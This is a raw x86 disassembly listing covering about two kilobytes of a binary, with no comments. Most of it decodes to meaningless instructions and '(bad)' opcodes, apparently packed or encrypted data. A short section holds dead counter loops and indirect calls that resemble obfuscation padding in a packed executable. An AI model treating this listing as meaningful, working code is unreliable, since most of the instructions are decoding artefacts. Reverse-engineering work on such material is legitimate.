  40a6be:	add    esp,DWORD PTR [eax]
  40a6c0:	dec    ah
  40a6c2:	xchg   BYTE PTR [ebx-0x1b],bl
  40a6c5:	dec    edi
  40a6c6:	outs   dx,DWORD PTR ds:[esi]
  40a6c7:	or     DWORD PTR [edi],0x4a0d03b0
  40a6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ce:	mov    al,0x8b
  40a6d0:	xchg   DWORD PTR [eax-0x19],esi
  40a6d3:	pop    esp
  40a6d4:	dec    ecx
  40a6d5:	lahf   
  40a6d6:	cmc    
  40a6d7:	push   edx
  40a6d8:	jge    0x483f6756
  40a6de:	jnp    0x40a6d8
  40a6e0:	adc    al,0xd6
  40a6e2:	cmp    BYTE PTR ds:0x61053fa4,al
  40a6e8:	mov    esp,0x1c96d7e9
  40a6ed:	push   edi
  40a6ee:	pusha  
  40a6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6f0:	push   es
  40a6f1:	mov    ah,0x78
  40a6f3:	call   0xa102:0xf1398aa6
  40a6fa:	repz daa 
  40a6fc:	pop    ss
  40a6fd:	rcr    DWORD PTR [edx+ecx*1],0x0
  40a701:	ja     0x40a754
  40a703:	inc    edi
  40a704:	sub    ah,BYTE PTR [edx+0x4e0df937]
  40a70a:	hlt    
  40a70b:	ret    0x2e17
  40a70e:	cs and eax,0xf9c78049
  40a714:	jmp    0x40a6d7
  40a716:	sub    ecx,DWORD PTR [ecx+0x5e]
  40a719:	jne    0x40a6fe
  40a71b:	mov    bh,0x6e
  40a71d:	pop    esi
  40a71e:	ret    0x45ae
  40a721:	push   ecx
  40a722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a723:	mov    ch,0x3f
  40a725:	xor    DWORD PTR [ecx-0x54515b89],ebx
  40a72b:	lods   eax,DWORD PTR ds:[esi]
  40a72c:	sub    ah,BYTE PTR [edx+0x39]
  40a72f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a730:	loope  0x40a6c1
  40a732:	jp     0x40a738
  40a734:	push   ds
  40a735:	ror    DWORD PTR [ecx-0x18],cl
  40a738:	js     0x40a751
  40a73a:	inc    edx
  40a73b:	std    
  40a73c:	test   al,0xe2
  40a73e:	test   BYTE PTR [ebx],0x2f
  40a741:	cmp    eax,eax
  40a743:	std    
  40a744:	push   0x485aac3a
  40a749:	or     eax,0x7930dca
  40a74e:	and    eax,0x5009b823
  40a753:	mov    ecx,0x8537a905
  40a758:	dec    ecx
  40a759:	xchg   edx,eax
  40a75a:	jo     0x40a715
  40a75c:	popa   
  40a75d:	push   edi
  40a75e:	mov    ds:0x8b2bf2ff,eax
  40a763:	js     0x40a76f
  40a765:	in     al,0xce
  40a767:	scas   eax,DWORD PTR es:[edi]
  40a768:	xor    cl,BYTE PTR [ebp-0x758a1ed4]
  40a76e:	out    0x4,eax
  40a770:	stos   DWORD PTR es:[edi],eax
  40a771:	lea    eax,[ecx+esi*8]
  40a774:	or     al,0xa7
  40a776:	aaa    
  40a777:	push   ebp
  40a778:	shr    BYTE PTR [ebx+edx*4-0x17],cl
  40a77c:	or     BYTE PTR [eax+0x4df13fd2],ch
  40a782:	fst    st(3)
  40a784:	jl     0x40a7c1
  40a786:	mov    al,0xb0
  40a788:	push   cs
  40a789:	repnz inc eax
  40a78b:	mov    ds:0xb1996fe1,al
  40a790:	stos   BYTE PTR es:[edi],al
  40a791:	stos   DWORD PTR es:[edi],eax
  40a792:	scas   eax,DWORD PTR es:[edi]
  40a793:	fist   WORD PTR [ebp+0x37]
  40a796:	xchg   esi,eax
  40a797:	jnp    0x40a794
  40a799:	push   ds
  40a79a:	inc    eax
  40a79b:	ja     0x40a78d
  40a79d:	cmc    
  40a79e:	lock mov ebx,0x48f4962c
  40a7a4:	out    dx,eax
  40a7a5:	sub    BYTE PTR [esi+0x42],dl
  40a7a8:	loopne 0x40a78d
  40a7aa:	and    edx,DWORD PTR [ecx-0x14]
  40a7ad:	add    DWORD PTR [esi],esi
  40a7af:	lock ins BYTE PTR es:[edi],dx
  40a7b1:	(bad)  
  40a7b2:	xchg   ebp,eax
  40a7b3:	lods   eax,DWORD PTR ds:[esi]
  40a7b4:	je     0x40a7ca
  40a7b6:	enter  0xa076,0xae
  40a7ba:	push   esp
  40a7bb:	sbb    BYTE PTR ds:0x75bfc8df,ah
  40a7c1:	mov    bl,0x70
  40a7c3:	dec    edx
  40a7c4:	xchg   edx,eax
  40a7c5:	adc    bh,ch
  40a7c7:	outs   dx,BYTE PTR ds:[esi]
  40a7c8:	les    ebx,FWORD PTR ds:0x83f740ae
  40a7ce:	pusha  
  40a7cf:	pop    edi
  40a7d0:	data16 shl BYTE PTR [ecx],1
  40a7d3:	and    DWORD PTR [ebx],0x12e6151f
  40a7d9:	xchg   esp,eax
  40a7da:	jecxz  0x40a788
  40a7dc:	test   al,0x26
  40a7de:	mov    esi,ecx
  40a7e0:	(bad)  
  40a7e1:	iret   
  40a7e2:	sbb    al,0x94
  40a7e4:	loop   0x40a845
  40a7e6:	sbb    BYTE PTR [edx],ch
  40a7e8:	mov    dh,BYTE PTR [eax+0x9]
  40a7eb:	stc    
  40a7ec:	or     al,0xb0
  40a7ee:	push   ds
  40a7ef:	imul   ebx,DWORD PTR [ebx-0x6],0x21f6dfdf
  40a7f6:	out    0xa0,al
  40a7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7f9:	push   esi
  40a7fa:	cmp    DWORD PTR [edi],edx
  40a7fc:	daa    
  40a7fd:	push   0xd10689f4
  40a802:	jns    0x40a787
  40a804:	xor    dh,dh
  40a806:	mov    eax,ds:0x363ea7c4
  40a80b:	sub    al,0xfb
  40a80d:	inc    eax
  40a80e:	mov    edi,ss
  40a810:	(bad)  
  40a811:	in     eax,0xe
  40a813:	sbb    al,0xab
  40a815:	or     al,0xbe
  40a817:	arpl   WORD PTR [eax-0x7930c5ad],si
  40a81d:	mov    edx,0x92900c55
  40a822:	inc    esi
  40a823:	add    edx,DWORD PTR [edx-0x6a]
  40a826:	jb     0x40a7af
  40a828:	in     al,0x43
  40a82a:	dec    esp
  40a82b:	aad    0xdd
  40a82d:	scas   eax,DWORD PTR es:[edi]
  40a82e:	in     al,0x22
  40a830:	or     DWORD PTR [ecx+eax*1-0x45ea6770],ecx
  40a837:	dec    ecx
  40a838:	inc    edi
  40a839:	mov    ch,0xb7
  40a83b:	and    DWORD PTR [ebp+0x78],ebx
  40a83e:	cmc    
  40a83f:	hlt    
  40a840:	or     al,0x88
  40a842:	xchg   esi,edx
  40a844:	(bad)  
  40a845:	in     eax,0xa6
  40a847:	(bad)  
  40a848:	inc    eax
  40a84a:	dec    edi
  40a84b:	popf   
  40a84c:	ret    
  40a84d:	lea    eax,[ebp-0x18]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x4303dd,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x4303e9,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x4303e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4303e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4303e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4303e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e87b
  40a89b:	call   DWORD PTR ds:0x42ebbf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4303e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43046b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4303ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e754,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e754
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e754,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e754,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e754,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e987
  40a90b:	cmp    DWORD PTR ds:0x42e754,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e754
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e754,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x6c136187],bl
  40a93e:	mov    eax,ds:0x7e7ee199
  40a943:	cs jge 0x40a9c4
  40a946:	jle    0x40a97b
  40a948:	xchg   ebp,eax
  40a949:	int3   
  40a94a:	and    al,0x9a
  40a94c:	pop    ecx
  40a94d:	in     al,0xbe
  40a94f:	dec    esp
  40a950:	out    dx,al
  40a951:	adc    cl,al
  40a953:	add    esi,ebx
  40a955:	fidiv  DWORD PTR [ebp-0x66686e7b]
  40a95b:	xchg   esp,eax
  40a95c:	pop    esp
  40a95d:	dec    ebx
  40a95e:	mov    ebp,0x5f56a544
  40a964:	shr    DWORD PTR [ecx-0x45],cl
  40a967:	in     eax,dx
  40a968:	mov    ebx,0xa1e201c2
  40a96d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a96e:	mov    dl,0xd1
  40a970:	xchg   esi,eax
  40a971:	push   ss
  40a972:	cmp    BYTE PTR [edi+0x36affcb8],ah
  40a978:	sub    al,0x14
  40a97a:	mov    edi,0xc9cef9cd
  40a97f:	jb     0x40a929
  40a981:	and    BYTE PTR [ebp-0x6bdc3d79],bl
  40a987:	dec    edi
  40a988:	mov    esp,0x43d6f223
  40a98d:	jge    0x40a921
  40a98f:	repnz dec ecx
  40a991:	fstp   QWORD PTR [ebp+0x37eaf2a9]
  40a997:	xchg   DWORD PTR [ebp-0x39],ebx
  40a99a:	stos   DWORD PTR es:[edi],eax
  40a99b:	jns    0x40a973
  40a99d:	fdivr  QWORD PTR [esi+ebp*2+0x7cb31c2c]
  40a9a4:	jmp    0xd1e67dd6
  40a9a9:	std    
  40a9aa:	jb     0x40aa29
  40a9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9ad:	xor    DWORD PTR [eax+0x4a05df8c],0xe7bc97fa
  40a9b7:	iret   
  40a9b8:	in     eax,dx
  40a9b9:	sub    edx,ebp
  40a9bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9bc:	test   BYTE PTR [eax+0x1d],bl
  40a9bf:	xor    al,0x3
  40a9c1:	jge    0x40aa06
  40a9c3:	leave  
  40a9c4:	loope  0x40a990
  40a9c6:	(bad)  
  40a9c7:	mov    DWORD PTR [edx+esi*8-0x58],esp
  40a9cb:	sbb    eax,0xf71cbd1c
  40a9d0:	jmp    0x56a6:0x74b3172
  40a9d7:	cmp    al,0xf6
  40a9d9:	xchg   esp,eax
  40a9da:	fild   WORD PTR [ecx-0x63]
  40a9dd:	leave  
  40a9de:	repz xchg ecx,eax
  40a9e0:	jmp    0x40aa30
  40a9e2:	mov    esi,0xf313e64f
  40a9e7:	stos   DWORD PTR es:[edi],eax
  40a9e8:	xor    dh,BYTE PTR [ebx-0x537ecfe7]
  40a9ee:	fdiv   QWORD PTR [esi]
  40a9f0:	cwde   
  40a9f1:	mov    ch,0x0
  40a9f3:	cmp    ecx,DWORD PTR [ebx+0x18]
  40a9f6:	adc    eax,0xfc045de2
  40a9fb:	xor    BYTE PTR [edx],bh
  40a9fd:	loopne 0x40aa66
  40a9ff:	fwait
  40aa00:	mov    edx,0x4c4ebf1e
  40aa05:	sbb    esp,DWORD PTR [ebx-0x746fc443]
  40aa0b:	or     al,0x43
  40aa0d:	loope  0x40aa30
  40aa0f:	retf   
  40aa10:	push   eax
  40aa11:	test   DWORD PTR [ebx+0x7004dde],esp
  40aa17:	out    dx,al
  40aa18:	mov    eax,ds:0x6bf1e7ce
  40aa1d:	jo     0x40a9c6
  40aa1f:	mov    WORD PTR [ebx+0x59],ss
  40aa22:	fs out dx,al
  40aa24:	push   ebx
  40aa25:	or     esp,ebp
  40aa27:	push   cs
  40aa28:	pop    ss
  40aa29:	jg     0x40a9c0
  40aa2b:	test   DWORD PTR [esi+0xa],edx
  40aa2e:	adc    edx,DWORD PTR [esi-0x70]
  40aa31:	lock aad 0x3c
  40aa34:	aad    0xd0
  40aa36:	jmp    0x7a2c:0x9a0a589f
  40aa3d:	or     ah,cl
  40aa3f:	cmp    BYTE PTR [esi+0x35],cl
  40aa42:	push   ebx
  40aa43:	mov    edx,0xb274a37a
  40aa48:	call   0x51baf39c
  40aa4d:	outs   dx,DWORD PTR ds:[esi]
  40aa4e:	ret    
  40aa4f:	push   edi
  40aa50:	(bad)  
  40aa51:	push   ss
  40aa52:	push   ebp
  40aa53:	stos   BYTE PTR es:[edi],al
  40aa54:	push   esi
  40aa55:	inc    ebp
  40aa56:	sbb    DWORD PTR gs:[edx],ebx
  40aa59:	add    al,0xb8
  40aa5b:	adc    esp,esp
  40aa5d:	test   ebp,esi
  40aa5f:	call   0xdb458ed6
  40aa64:	adc    al,0xe8
  40aa66:	mov    WORD PTR [ecx],ds
  40aa68:	xchg   BYTE PTR [ebp-0x5b54f2e1],cl
  40aa6e:	popf   
  40aa6f:	arpl   WORD PTR [ecx-0x4b],si
  40aa72:	repz xor DWORD PTR [ebp+0x72fed536],0x5e
  40aa7a:	pop    ebx
  40aa7b:	cs clc 
  40aa7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa7e:	cmp    bh,BYTE PTR [ebx+0x5962def0]
  40aa84:	sti    
  40aa85:	hlt    
  40aa86:	sbb    cl,BYTE PTR [esi+0x5163faa9]
  40aa8c:	fst    QWORD PTR [esi]
  40aa8e:	lea    ecx,[ebp-0x4ee05dd8]
  40aa94:	(bad)  
  40aa95:	push   ds
  40aa96:	and    al,0x9a
  40aa98:	inc    ebx
  40aa99:	fnstsw WORD PTR [edi+esi*4+0x1a854b60]
  40aaa0:	icebp  
  40aaa1:	in     eax,0x8
  40aaa3:	cmp    ebp,ebx
  40aaa5:	out    0x9d,eax
  40aaa7:	in     al,dx
  40aaa8:	sub    bl,BYTE PTR [esi-0x6c]
  40aaab:	xor    eax,0x66fad920
  40aab0:	xor    ebp,DWORD PTR [ebx-0x19]
  40aab3:	or     ecx,esi
  40aab5:	xor    ebp,esi
  40aab7:	mov    eax,?
  40aab9:	jbe    0x40ab02
  40aabb:	pop    es
  40aabc:	cmp    cl,0x8f
  40aabf:	lods   eax,DWORD PTR ds:[esi]
  40aac0:	daa    
  40aac1:	cmp    BYTE PTR [ecx+ebp*4+0x72ee4001],dh
  40aac8:	mov    BYTE PTR [eax-0x13],0x4c
  40aacc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aacd:	clc    
  40aace:	mov    ch,BYTE PTR [eax+0x39dd9a33]
  40aad4:	mov    ds:0xe04c69a9,eax
  40aad9:	test   eax,0xa3e4e06b
  40aade:	fbstp  TBYTE PTR [eax-0x178abf46]
  40aae4:	mov    cl,0x2b
  40aae6:	fsub   st(1),st
  40aae8:	or     al,0x32
  40aaea:	fdiv   QWORD PTR [ebx+0x29]
  40aaed:	or     esi,DWORD PTR [esi+0x75e8c138]
  40aaf3:	mov    BYTE PTR [edi+0x2a],al
  40aaf6:	fs (bad) 
  40aaf8:	or     DWORD PTR [edi],edi
  40aafa:	xor    al,0xd1
  40aafc:	jb     0x40ab50
  40aafe:	or     al,0x6b
  40ab00:	dec    edi
  40ab01:	loope  0x40ab02
  40ab03:	xchg   esi,eax
  40ab04:	or     edx,DWORD PTR [edx-0x1a]
  40ab07:	ins    BYTE PTR es:[edi],dx
  40ab08:	and    al,bl
  40ab0a:	fild   DWORD PTR [ebx-0x649d8dc7]
  40ab10:	mov    esp,0x1c8006ed
  40ab15:	jb     0x40aadc
  40ab17:	xchg   esi,eax
  40ab18:	aam    0xfa
  40ab1a:	aad    0xab
  40ab1c:	jp     0x40ab25
  40ab1e:	int3   
  40ab1f:	iret   
  40ab20:	stc    
  40ab21:	dec    di
  40ab23:	adc    esp,eax
  40ab25:	aad    0xf7
  40ab27:	pop    es
  40ab28:	sbb    eax,0xb4ee1387
  40ab2d:	jo     0x40ab2a
  40ab2f:	or     ch,BYTE PTR [eax+0x35]
  40ab32:	idiv   esp
  40ab34:	mov    edi,0xebe35857
  40ab39:	mov    eax,0xcf22ace0
  40ab3e:	xor    bl,BYTE PTR [esi]
  40ab40:	sbb    DWORD PTR [ebx],0x6e
  40ab43:	sbb    al,BYTE PTR es:[ecx]
  40ab46:	push   edi
  40ab47:	in     eax,dx
  40ab48:	cli    
  40ab49:	jecxz  0x40ab9b
  40ab4b:	into   
  40ab4c:	mov    dl,BYTE PTR [ecx+esi*8]
  40ab4f:	jl     0x40ab82
  40ab51:	stos   DWORD PTR es:[edi],eax
  40ab52:	or     al,0xa7
  40ab54:	dec    ecx
  40ab55:	xor    cl,dh
  40ab57:	jnp    0x40ab04
  40ab59:	(bad)  
  40ab5a:	sub    al,0x89
  40ab5c:	sub    al,0xb8
  40ab5e:	adc    al,0x6f
  40ab60:	jl     0x40ab7c
  40ab62:	(bad)  
  40ab63:	xchg   esi,eax
  40ab64:	pop    eax
  40ab65:	std    
  40ab66:	push   ecx
  40ab67:	fwait
  40ab68:	jmp    0x9f683256
  40ab6d:	mov    ebp,0xb32e2d52
  40ab72:	pop    edi
  40ab73:	jecxz  0x40aafe
  40ab75:	adc    DWORD PTR [esi],ebx
  40ab77:	pop    ebx
  40ab78:	dec    edx
  40ab79:	aas    
  40ab7a:	dec    ebp
  40ab7b:	cmp    BYTE PTR [ecx+ebx*2],dl
  40ab7e:	cmp    BYTE PTR [edx],bh
  40ab80:	jbe    0x40ab9f
  40ab82:	loop   0x40abfe
  40ab84:	push   es
  40ab85:	cmp    bh,BYTE PTR [ecx-0x3cda1939]
  40ab8b:	pop    ss
  40ab8c:	arpl   WORD PTR [ebx],bp
  40ab8e:	lock lock jns 0x40abda
  40ab92:	and    al,0xb2
  40ab94:	out    dx,eax
  40ab95:	add    ebp,DWORD PTR [esi-0x36]
  40ab98:	and    ebp,DWORD PTR ds:0xe31d4e1e
  40ab9e:	call   0x1814:0x34eebd4f
  40aba5:	or     ch,BYTE PTR [ebx+0x267932b7]
  40abab:	mov    al,ds:0xcf676f7c
  40abb0:	lock sbb dl,BYTE PTR [ecx+0x3559b965]
  40abb7:	mov    ecx,0x5190f412
  40abbc:	cs xchg esi,eax
  40abbe:	out    0x9f,eax
  40abc0:	sub    BYTE PTR [eax],0xd8
  40abc3:	icebp  
  40abc4:	dec    esp
  40abc5:	push   ebx
  40abc6:	or     eax,0xffffffaa
  40abc9:	fs jmp 0xac8c:0x7745728d
  40abd1:	arpl   WORD PTR [esi+0x19],sp
  40abd4:	mov    ch,BYTE PTR [edx-0x74ce991a]
  40abda:	add    eax,0x74f64eb1
  40abdf:	mov    ah,0xb5
  40abe1:	fdiv   DWORD PTR [esi+0x3b86fdaa]
  40abe7:	aam    0x1d
  40abe9:	add    DWORD PTR [esi],0x4598c95
  40abef:	jle    0x40ab72
  40abf1:	and    ebp,DWORD PTR gs:[edi]
  40abf4:	adc    cl,ah
  40abf6:	arpl   WORD PTR [ecx-0x1f],cx
  40abf9:	sbb    dh,BYTE PTR [ebp-0x3f]
  40abfc:	inc    edi
  40abfd:	adc    BYTE PTR [esi+0x5f449829],0xf6
  40ac04:	rol    BYTE PTR [ebx-0x695daff5],1
  40ac0a:	nop
  40ac0b:	scas   al,BYTE PTR es:[edi]
  40ac0c:	fild   DWORD PTR [ecx]
  40ac0e:	mov    edx,0x20c20726
  40ac13:	jg     0x40ac10
  40ac15:	in     eax,0x4e
  40ac17:	inc    ebx
  40ac18:	mov    edi,0x91332630
  40ac1d:	dec    edi
  40ac1e:	sbb    al,0x65
  40ac20:	es aam 0x98
  40ac23:	xchg   esp,eax
  40ac24:	add    ebx,esp
  40ac26:	jnp    0x40abf3
  40ac28:	icebp  
  40ac29:	adc    DWORD PTR [ecx-0x7a4df0e1],0x30
  40ac30:	dec    ecx
  40ac31:	xor    DWORD PTR [ecx],0xce42b237
  40ac37:	xchg   ecx,eax
  40ac38:	(bad)  
  40ac39:	xor    cl,BYTE PTR [edx+0x4e009bc0]
  40ac3f:	push   0xffffffed
  40ac41:	push   esi
  40ac42:	dec    ebp
  40ac43:	adc    eax,0x2d66e8f8
  40ac48:	aas    
  40ac49:	leave  
  40ac4a:	xor    dh,BYTE PTR [edx]
  40ac4c:	xor    al,0xce
  40ac4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac4f:	jle    0x40ac63
  40ac51:	mov    ds,WORD PTR [eax+0x3f8074d2]
  40ac57:	cmp    ebx,esp
  40ac59:	mov    ch,BYTE PTR [edi+0x3542c2c2]
  40ac5f:	stc    
  40ac60:	adc    BYTE PTR [eax-0x73],dh
  40ac63:	add    BYTE PTR [eax+ebx*2],0xc
  40ac67:	xor    al,0xd9
  40ac69:	leave  
  40ac6a:	pop    ebx
  40ac6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac6c:	sbb    DWORD PTR [edi+0x23],esi
  40ac6f:	push   0xc
  40ac71:	je     0x40acdc
  40ac73:	sub    edx,DWORD PTR [ebx]
  40ac75:	and    dl,BYTE PTR [eax-0x5f]
  40ac78:	jl     0x40ac9c
  40ac7a:	inc    ecx
  40ac7b:	add    BYTE PTR [ebx-0x71ed0148],bh
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	cmp    ah,ch
  40ac94:	jbe    0x40ac95
  40ac96:	dec    ecx
  40ac97:	in     al,dx
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac89
  40ac9f:	call   0x7f74f9dc
  40aca4:	mov    al,0xb9
  40aca6:	push   es
  40aca7:	add    eax,0x2edf8f7a
  40acac:	jle    0x40ad04
  40acae:	mov    eax,ds:0x60ed3427
  40acb3:	mov    ebp,0x19a8e78f
  40acb8:	repz xchg ebx,eax
  40acba:	inc    ebx
  40acbb:	and    ebx,DWORD PTR [ebx+0x4cc0b392]
  40acc1:	xor    edx,DWORD PTR [edi+0x699e2b81]
  40acc7:	packsswb mm1,mm2
  40acca:	lods   al,BYTE PTR ds:[esi]
  40accb:	jmp    0x1105:0xeeabfa47
  40acd2:	dec    edx
  40acd3:	adc    al,0xd1
  40acd5:	into   
  40acd6:	sahf   
  40acd7:	inc    ebp
  40acd8:	sbb    BYTE PTR [ecx-0x69],bh
  40acdb:	retf   0x5cce
  40acde:	push   edx
  40acdf:	leave  
  40ace0:	xchg   esp,eax
  40ace1:	xchg   esp,eax
  40ace2:	inc    edx
  40ace3:	imul   esi,DWORD PTR [ebp+esi*8-0x50],0xffffffe8
  40ace8:	clc    
  40ace9:	out    0x5d,eax
  40aceb:	fcomp  DWORD PTR [edi]
  40aced:	mov    ds:0xa8b2f93b,al
  40acf2:	or     ebp,esp
  40acf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acf5:	out    dx,al
  40acf6:	mov    ebp,0xaf8d604b
  40acfb:	xor    eax,0xb8b4b78d
  40ad00:	cmp    esi,DWORD PTR [eax+0x527141c8]
  40ad06:	inc    edi
  40ad07:	mov    esi,DWORD PTR [ebp+0x36]
  40ad0a:	or     BYTE PTR [edx+0x1e446211],dh
  40ad10:	aaa    
  40ad11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad12:	xor    dh,BYTE PTR [eax+0x5a0be2ef]
  40ad18:	stc    
  40ad19:	mov    ebx,0xe147f81e
  40ad1e:	hlt    
  40ad1f:	test   edi,eax
  40ad21:	aas    
  40ad22:	cmp    edi,DWORD PTR [ebp-0x7b]
  40ad25:	sbb    al,0x5f
  40ad27:	jle    0x40acb6
  40ad29:	cmp    eax,0x62f56a15
  40ad2e:	dec    ebx
  40ad2f:	add    BYTE PTR [edx+0x1e60c12f],cl
  40ad35:	xchg   ebp,eax
  40ad36:	mov    cl,0x5
  40ad38:	repz inc edx
  40ad3a:	inc    ebx
  40ad3b:	popf   
  40ad3c:	or     ebx,DWORD PTR [esi]
  40ad3e:	in     al,dx
  40ad3f:	xor    esi,ebx
  40ad41:	in     al,dx
  40ad42:	outs   dx,BYTE PTR ds:[esi]
  40ad43:	out    0x94,al
  40ad45:	sbb    ch,bh
  40ad47:	push   esp
  40ad48:	dec    ebp
  40ad49:	or     DWORD PTR [edi+0x3b],eax
  40ad4c:	jl     0x40ad99
  40ad4e:	jno    0x40acd0
  40ad50:	adc    bl,0x7e
  40ad53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad54:	jns    0x40ad84
  40ad56:	fstp   QWORD PTR [esi-0x7c]
  40ad59:	push   0xffffffb1
  40ad5b:	or     bh,BYTE PTR [ebx-0x810a1db]
  40ad61:	fild   WORD PTR [ecx]
  40ad63:	mov    al,ds:0xbe7c8771
  40ad68:	ins    BYTE PTR es:[edi],dx
  40ad69:	fwait
  40ad6a:	loop   0x40aced
  40ad6c:	push   esi
  40ad6d:	(bad)
  40ad72:	jb     0x40ade5
  40ad74:	adc    eax,DWORD PTR es:[edx+eiz*4-0x78]
  40ad79:	pop    ecx
  40ad7a:	in     al,dx
  40ad7b:	test   eax,0x5db5f86c
  40ad80:	xchg   edi,eax
  40ad81:	pop    ecx
  40ad82:	(bad)  [esi-0x76d27cb4]
  40ad88:	sbb    BYTE PTR [eax],0xa2
  40ad8b:	and    DWORD PTR [ebx-0x39adc537],edx
  40ad91:	(bad)
  40ad95:	sub    ah,BYTE PTR [esi-0x65]
  40ad98:	cmp    dh,dl
  40ad9a:	mov    al,BYTE PTR [ebp-0xa33f255]
  40ada0:	(bad)  
  40ada1:	out    dx,eax
  40ada2:	imul   edx,DWORD PTR ds:0xd01fde83,0xffffffef
  40ada9:	jmp    0xfa41df0a
  40adae:	pop    esi
  40adaf:	xchg   DWORD PTR [ebx+0x1b],ecx
  40adb2:	sbb    ebp,ecx
  40adb4:	adc    ch,cl
  40adb6:	div    BYTE PTR [eax]
  40adb8:	xchg   edx,eax
  40adb9:	test   al,0xd2
  40adbb:	adc    ebx,DWORD PTR [ebp+0x7b]
  40adbe:	mov    eax,0xb3230bf5
  40adc3:	rcl    DWORD PTR [edi+0x0],0xd8
  40adc7:	out    dx,eax
  40adc8:	jne    0x40add6
  40adca:	add    DWORD PTR [edi+0x54f31a49],eax
  40add0:	aad    0x53
  40add2:	adc    BYTE PTR [esi],dh
  40add4:	cld    
  40add5:	aaa    
  40add6:	jo     0x40adf5
  40add8:	xchg   BYTE PTR [ebp-0x2a325ca3],cl
  40adde:	add    eax,0x6a4f8ee3
  40ade3:	loope  0x40ad8c
  40ade5:	dec    DWORD PTR [ecx-0x64]
  40ade8:	add    BYTE PTR [edi-0x17],0x1e
  40adec:	ja     0x40ae69
  40adee:	fmul   DWORD PTR [eax]
  40adf0:	adc    bh,ah
  40adf2:	sub    BYTE PTR [esi+0x17bb455],dh
  40adf8:	sub    eax,0x8415e1ca
  40adfd:	xor    al,BYTE PTR ds:0x183ea2b
  40ae03:	push   edi
  40ae04:	daa    
  40ae05:	clc    
  40ae06:	aaa    
  40ae07:	fdivrp st(1),st
  40ae09:	ins    BYTE PTR es:[edi],dx
  40ae0a:	cmc    
  40ae0b:	mov    ebp,0x35f0a1e2
  40ae10:	ss das 
  40ae12:	fcomp  DWORD PTR [ebx]
  40ae14:	mov    ebp,0xcc9e0e4b
  40ae19:	xchg   DWORD PTR [ebx],esp
  40ae1b:	cdq    
  40ae1c:	sbb    DWORD PTR [ecx-0x17],0xffffffa5
  40ae20:	das    
  40ae21:	or     bh,al
  40ae23:	inc    esi
  40ae24:	ins    BYTE PTR es:[edi],dx
  40ae25:	push   esp
  40ae26:	push   0xf4a814fd
  40ae2b:	mov    esi,0x2857d6af
  40ae30:	stc    
  40ae31:	mov    ah,0xc2
  40ae33:	ins    BYTE PTR es:[edi],dx
  40ae34:	cmp    cl,bl
  40ae36:	mov    edi,0x1fbd71db
  40ae3b:	jg     0x40ae24
  40ae3d:	ss dec ebx
  40ae3f:	inc    edx
  40ae40:	retf   
  40ae41:	pop    es
  40ae42:	scas   eax,DWORD PTR es:[edi]
  40ae43:	sar    DWORD PTR [ebx+0x65230d6a],cl
  40ae49:	stos   DWORD PTR es:[edi],eax
  40ae4a:	pop    edi
  40ae4b:	jle    0x40ae97
  40ae4d:	jne    0x40ae65
  40ae4f:	inc    edi
  40ae50:	inc    esi
  40ae51:	leave  
  40ae52:	ins    DWORD PTR es:[edi],dx
  40ae53:	ret    
  40ae54:	pop    es
  40ae55:	test   DWORD PTR [edx+0x36],esp
  40ae58:	adc    al,0x33
  40ae5b:	sub    al,0xe2
  40ae5d:	mov    esp,0x58a84adb
  40ae62:	in     al,dx
  40ae63:	dec    edx
  40ae64:	inc    esi
  40ae65:	scas   eax,DWORD PTR es:[edi]
  40ae66:	call   0xb503f4a7
  40ae6b:	test   DWORD PTR [edi+edi*8],esi
